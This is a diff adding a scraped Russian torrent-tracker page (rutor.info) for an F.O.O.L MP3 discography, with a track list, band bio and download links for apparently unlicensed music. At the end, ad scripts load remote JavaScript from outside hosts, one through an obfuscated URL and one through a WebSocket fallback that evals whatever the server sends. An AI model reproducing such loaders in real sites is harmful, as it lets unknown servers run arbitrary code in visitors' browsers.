@@ -1,0 +1,510 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: F.O.O.L - Discography (2010-2015) MP3</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>F.O.O.L - Discography (2010-2015) MP3</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:3aac9c22ceb88efde0aafde692323ab1c1d5080a&amp;dn=rutor.info_F.O.O.L+-+Discography+%282010-2015%29+MP3&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630532"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630532"><img src="http://s.rutor.info/t/down.png"> Скачать F.O.O.L__-_Discography.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://a.radikal.ru/a20/1805/f0/33480eaa739b.jpg" /><br />
+<br />
+<b>Название</b>:  Discography<br />
+<b>Исполнитель</b>: F.O.O.L<br />
+<b>Год</b>: 2010-2015<br />
+<b>Жанр</b>:  <a href="/tag/2/Electro" target="_blank">Electro</a>, <a href="/tag/2/House" target="_blank">House</a>, <a href="/tag/2/Dubstep" target="_blank">Dubstep</a>, <a href="/tag/2/Techno" target="_blank">Techno</a><br />
+<b>Страна</b>: <img src="https://d.radikal.ru/d31/1805/cb/4317d93fbd85.jpg" /> Sweden<br />
+<br />
+<b>Продолжительность</b>:  10:35:57<br />
+<b>Формат/Кодек</b>: MP3<br />
+<b>Битрейт аудио</b>: 320 kbps<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Трек-лист:</div><div class="hidebody"></div><textarea class="hidearea"><b><span style="color:blue;">Singles &amp; EPs</span></b><br />
+<b>2010 - F.O.O.L - Berserkergang</b><br />
+01. F.O.O.L - Berserkergang ft. A Girl And A Gun (Original Mix) (3:30)<br />
+02. F.O.O.L - Berserkergang ft. A Girl And A Gun (Owl Vision Remix) (3:39)<br />
+03. F.O.O.L - Berserkergang ft. A Girl And A Gun (Calis Remix) (4:16)<br />
+04. F.O.O.L - Berserkergang ft. A Girl And A Gun (Noize Generation Remix) (3:56)<br />
+05. F.O.O.L - Berserkergang ft. A Girl And A Gun (Drivepilot Remix) (4:48)<br />
+06. F.O.O.L - Berserkergang ft. A Girl And A Gun (Beef Theatre Remix) (4:32)<br />
+<br />
+<b>2010 - F.O.O.L - We Are Not French</b><br />
+01. F.O.O.L - We&#039;re Not French (Haezer Remix) (3:57)<br />
+02. F.O.O.L - We&#039;re Not French (The Boomzers Remix) (6:01)<br />
+03. F.O.O.L - We&#039;re Not French (Original Mix) (3:55)<br />
+04. F.O.O.L - We&#039;re Not French (The Noisy Freaks Remix) (3:13)<br />
+05. F.O.O.L - We&#039;re Not French (Owl Vision Remix) (4:12)<br />
+06. F.O.O.L - We&#039;re Not French (Drivepilot Remix) (4:59)<br />
+07. F.O.O.L - We&#039;re Not French (Trashing Teenagers Remix) (4:00)<br />
+08. F.O.O.L - We&#039;re Not French (The Mastertrons Remix) (3:43)<br />
+<br />
+<b>2010 - F.O.O.L - Reborn</b><br />
+01. F.O.O.L - Reborn (Original Mix) (4:15)<br />
+02. F.O.O.L - Reborn (Tom Deluxx Remix) (4:12)<br />
+03. F.O.O.L - Reborn (Haezer Remix) (4:45)<br />
+04. F.O.O.L - Reborn (Redial Remix) (4:21)<br />
+05. F.O.O.L - Reborn (The Boomzers Remix) (4:37)<br />
+06. F.O.O.L - Reborn (RETZ Remix) (5:22)<br />
+07. F.O.O.L - Escape The Cave (Original Mix) (3:25)<br />
+<br />
+<b>2011 - F.O.O.L - To Japan And Never Back</b><br />
+01. F.O.O.L - To Japan And Never Back I (4:23)<br />
+02. F.O.O.L - To Japan And Never Back II (4:11)<br />
+03. F.O.O.L - To Japan And Never Back III (3:48)<br />
+04. F.O.O.L - To Japan And Never Back (Dead C∆T Bounce Remix) (4:00)<br />
+05. F.O.O.L - To Japan And Never Back (Ishivu Remix) (7:07)<br />
+06. F.O.O.L - Dark Cyan Night (Original Mix) (3:35)<br />
+07. F.O.O.L - Dark Cyan Night (AutoLaser Remix) (3:48)<br />
+08. F.O.O.L - Dark Cyan Night (Redial Remix) (4:44)<br />
+<br />
+<b>2011 - F.O.O.L - Call To Krieg</b><br />
+01. F.O.O.L - To Arms (4:57)<br />
+02. F.O.O.L - Krieg (4:36)<br />
+03. F.O.O.L - Machine Gun (Zip It Up) (3:51)<br />
+04. F.O.O.L - Krieg (Nadisko Remix) (4:10)<br />
+05. F.O.O.L - Krieg (Ugly Kids Remix) (4:20)<br />
+<br />
+<b>2011 - F.O.O.L - Invasion</b><br />
+01. F.O.O.L - Invasion (Original Mix) (4:01)<br />
+02. F.O.O.L - Invasion (The S Remix) (5:30)<br />
+03. F.O.O.L - Invasion (Ikki Remix) (5:30)<br />
+04. F.O.O.L - Invasion (Figure Remix) (3:52)<br />
+05. F.O.O.L - Invasion (Trumpdisco Remix) (4:19)<br />
+06. F.O.O.L - Invasion (Dumme Jungs Remix) (4:05)<br />
+07. F.O.O.L - Invasion (Neus Remix) (4:48)<br />
+<br />
+<b>2012 - F.O.O.L - The Game </b><br />
+01. F.O.O.L - The Game (Original Mix) (5:11)<br />
+02. F.O.O.L - Execute (Original Mix) (5:15)<br />
+03. F.O.O.L - Smasher ft. Redial (Original Mix) (5:47)<br />
+04. F.O.O.L - Drama (Original Mix) (3:54)<br />
+05. F.O.O.L - Truly One (Original Mix) (3:38)<br />
+06. F.O.O.L - Night Cruiser (Original Mix) (5:20)<br />
+07. F.O.O.L - Knockout (Original Mix) (5:09)<br />
+<br />
+<b>2012 - F.O.O.L - Melodies Of The Oridnary</b><br />
+01. F.O.O.L - Fleya (Original Mix) (3:04)<br />
+02. F.O.O.L - Dark Side (Original Mix) (4:15)<br />
+03. F.O.O.L - We Are (Original Mix) (5:17)<br />
+04. F.O.O.L - Fortune (Original Mix) (4:46)<br />
+05. F.O.O.L - Destruction (Original Mix) (5:02)<br />
+06. F.O.O.L - Nonsense (Original Mix) (4:15)<br />
+07. F.O.O.L - The Beginning (Original Mix) (4:32)<br />
+08. F.O.O.L - Nighthum (Original Mix) (4:21)<br />
+<br />
+<b>2012 - F.O.O.L - Visions EP</b><br />
+01. F.O.O.L - SaharA (Original Mix) (4:31)<br />
+02. F.O.O.L - Dangerous ft. Antichrist (Original Mix) (3:59)<br />
+03. F.O.O.L - Animus (Original Mix) (5:18)<br />
+04. F.O.O.L - Vision (Original Mix) (5:05)<br />
+05. F.O.O.L - Vision (Bestrack Remix) (3:37)<br />
+<br />
+<b>2013 - F.O.O.L - Destroyer Of Speakers </b><br />
+01. F.O.O.L - Destroyer Of Speakers (Original Mix) (4:36)<br />
+02. F.O.O.L - Groovy (Original Mix) (4:40)<br />
+03. F.O.O.L - Punks (Original Mix) (6:24)<br />
+04. F.O.O.L - The Thief (Original Mix) (3:39)<br />
+05. F.O.O.L - Transmission (Original Mix) (4:18)<br />
+<br />
+<b>2013 - F.O.O.L - Feelings</b><br />
+01. F.O.O.L - Feelings (Original Mix) (5:45)<br />
+02. F.O.O.L - Invaders (Original Mix) (5:07)<br />
+03. F.O.O.L - Warriors (Original Mix) (4:52)<br />
+04. F.O.O.L - Feed Us (Original Mix) (4:20)<br />
+05. F.O.O.L - Get Down (Original Mix) (4:20)<br />
+06. F.O.O.L - Feelings (Lets Be Friends Remix) (5:39)<br />
+07. F.O.O.L - Feelings (Anzo Remix) (6:08)<br />
+08. F.O.O.L - Feelings (Chimeric Remix) (4:08)<br />
+09. F.O.O.L - Feelings (Falcon Funk Remix) (4:20)<br />
+<br />
+<b>2014 - F.O.O.L - Keep On Rocking</b><br />
+01. F.O.O.L - Keep On Rocking (5:01)<br />
+<br />
+<b>2014 - F.O.O.L - Throne</b><br />
+01. F.O.O.L - Throne (Original Mix) (5:05)<br />
+<br />
+<b>2015 - F.O.O.L - Knight </b><br />
+01. F.O.O.L - Knight (3:48)<br />
+02. F.O.O.L - Bounty Hunter (4:49)<br />
+03. F.O.O.L - Fairytaler (3:13)<br />
+04. F.O.O.L - Distorted Reality (4:33)<br />
+<br />
+<b><span style="color:blue;">Remixes</span></b><br />
+01. Antichrist - Night Shadow (F.O.O.L Dubstep Remix) (4:33), 320 kbps<br />
+02. Beef Theatre - President Evil (F.O.O.L Alternative Orchestra Remix) (6:34), 320 kbps<br />
+03. Beef Theatre - President Evil (F.O.O.L Remix) (4:52), 320 kbps<br />
+04. Boys Noize - Reality (F.O.O.L Remix) (4:33), 320 kbps<br />
+05. Dada Life - Fight Club Is Closed (F.O.O.L&#039;s Chillout Remix) (3:54), 320 kbps<br />
+06. Daft Punk - Technologic (F.O.O.L Remix) (5:10), 320 kbps<br />
+07. Danger - 4h30 (F.O.O.L Remix) (5:42), 320 kbps<br />
+08. DJ Antention - Rapid Fire (F.O.O.L Remix) (3:27), 320 kbps<br />
+09. Drivepilot - Fuck Yeah! (F.O.O.L Remix) (3:15), 320 kbps<br />
+10. Fckn Crew - Discoke (F.O.O.L Remix) (2:55), 320 kbps<br />
+11. Freak Slaughter - Hybrid (F.O.O.L Remix) (5:02), 320 kbps<br />
+12. Fresh Foolish - Awake (F.O.O.L Remix) (3:45), 320 kbps<br />
+13. Future Cop! - Misanthr:)pist Wolf (F.O.O.L Remix) (5:30), 320 kbps<br />
+14. Gtronic - Iron Man (F.O.O.L Remix) (5:04), 320 kbps<br />
+15. Haezer - Anarchy! (F.O.O.L Remix) (3:16), 320 kbps<br />
+16. Haezer - It&#039;s Not Our Fault (F.O.O.L Remix) (3:30), 320 kbps<br />
+17. Haezer - Monkey (F.O.O.L Fuckin Death Re-Cut) (2:52), 320 kbps<br />
+18. Hantise - Despotic Freak Show (F.O.O.L Remix) (4:51), 320 kbps<br />
+19. Homeboi - Down South (F.O.O.L Remix) (4:09), 320 kbps<br />
+20. Ill Saint M - Hybris (F.O.O.L Remix) (4:02), 320 kbps<br />
+21. Jungle Fiction - Dead City (F.O.O.L Remix) (4:00), 320 kbps<br />
+22. Jungle Fiction - Transhuman (F.O.O.L Remix) (4:00), 320 kbps<br />
+23. Kavinsky - Nightcall (F.O.O.L Remix) (5:49), 320 kbps<br />
+24. Kavinsky - Road Game (F.O.O.L Remix) (5:04), 320 kbps<br />
+25. Life Express - Wistful Idiot (FOOL Remix) (5:36), 320 kbps<br />
+26. Lisseman - Let The Beast Go Out (F.O.O.L Remix) (4:06), 320 kbps<br />
+27. Monarken - Superhjälte (F.O.O.L Remix) (3:33), 320 kbps<br />
+28. Mr. Oizo - Pourriture 7 (F.O.O.L Remix) (2:20), 320 kbps<br />
+29. Neus - Blast! (F.O.O.L Remix) (3:19), 320 kbps<br />
+30. Noize Generation - Light (F.O.O.L Remix) (2:55), 320 kbps<br />
+31. Noize Generation ft. Circe - Get The Fuck Up (F.O.O.L Remix) (3:19), 320 kbps<br />
+32. Owl Vision - The Black Death (F.O.O.L Remix) (4:36), 320 kbps<br />
+33. Pendulum - The Island (F.O.O.L Alternative Remix) (5:01), 320 kbps<br />
+34. Pendulum - The Island (F.O.O.L Remix) (4:07), 320 kbps<br />
+35. Redial - The Boss (F.O.O.L Remix) (3:24), 320 kbps<br />
+36. Ren Riz - Swamp (F.O.O.L Remix) (3:22), 320 kbps<br />
+37. S-File - Heads Up (F.O.O.L Remix) (4:12), 320 kbps<br />
+38. Tiger &amp; Wolf - Feed The Beast (F.O.O.L Remix) (5:20), 320 kbps<br />
+39. Trashing Teenagers - Wrath Of God (F.O.O.L Remix) (4:40), 320 kbps<br />
+40. X-ettl ft. Loner - Raw Rage (F.O.O.L Remix) (4:04), 320 kbps<br />
+41. You Killing Me - Can&#039;t Stop (F.O.O.L Remix) (3:22), 320 kbps<br />
+42. Zeds Dead &amp; Omar Linx - Cowboy (F.O.O.L Remix) (4:53), 320 kbps<br />
+43. Gemini - Fire Inside (F.O.O.L Remix) (5:53), 320 kbps<br />
+44. Mr. Miyagi - We Gonna Give You The Lession (F.O.O.L Remix) (3:16), 320 kbps<br />
+45. Tikkle Me - Time To Act (F.O.O.L Remix) (5:11), 320 kbps<br />
+46. Designer Drugs - Drugs Are In Control (F.O.O.L Remix) (3:47), 320 kbps<br />
+47. Danger - 1:30 (F.O.O.L Remix) (4:18), 320 kbps<br />
+48. Astronaut &amp; Far Too Loud - War (F.O.O.L &amp; Didrick Remix) (3:55), 320 kbps<br />
+49. Style Of Eye ft. Anna Stahl - More Than A Lover (F.O.O.L Remix) (4:50), 320 kbps<br />
+<br />
+<b><span style="color:blue;">Tracks</span></b><br />
+01. Daze ft. F.O.O.L - Restless (4:45), 320 kbps<br />
+02. F.O.O.L &amp; Your Ol Lady - Deaf (5:09), 320 kbps<br />
+03. F.O.O.L - Comboe (Original Mix) (6:09), 320 kbps<br />
+04. F.O.O.L - Fuck It (Original Mix) (4:41), 320 kbps<br />
+05. F.O.O.L - Gripfenklou&#039;s Castle (Original Mix) (3:13), 320 kbps<br />
+06. F.O.O.L - Puddin&#039; (Original Mix) (4:01), 320 kbps<br />
+07. F.O.O.L - Rising Drunk Stars (Original Mix) (3:43), 320 kbps<br />
+08. F.O.O.L - Smoke &amp; Death (4:56), 320 kbps<br />
+09. F.O.O.L - Lazer Jungle (4:06), 320 kbps<br />
+10. F.O.O.L - Tutorials (3:30), 320 kbps<br />
+11. F.O.O.L - Slayer (5:18), 320 kbps<br />
+12. F.O.O.L - Afraid (4:40), 320 kbps<br />
+<br />
+Автор сборки: <b>TagirM</b></textarea></div><br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Доп. информация:</div><div class="hidebody"></div><textarea class="hidearea"><img src="https://d.radikal.ru/d37/1805/96/6f5e5af39fd0.jpg" /><br />
+<br />
+<b>F.O.O.L (Fuck Our Ordinary Lives)</b> - электронный дуэт из Швеции, состоящий из продюсера и диджея Расмуса Хермансена (Rasmus Hermansen) и диджея Оливера Нильсона (Oliver Nilsson).<br />
+Группа образовалась в конце 2009 года. Выпустив дебютный бесплатный интернет релиз Ashy Diamond Lungs ЕР, они быстро завоевывають тысячи поклонников по всему миру.</textarea></div></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/443257/0" target="_blank">scratches</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/audio" target="_blank">Музыка</a></td></tr>
+<tr><td class="header">Раздают</td><td>3</td></tr>
+<tr><td class="header">Качают</td><td>8</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (18 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 19:28:49  (13 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>1.43&nbsp;GB  (1535174374 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630532);">закладки</span></td>
+</tr>
+
+
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630532.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (157)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630532">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630532);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630532);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630532">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
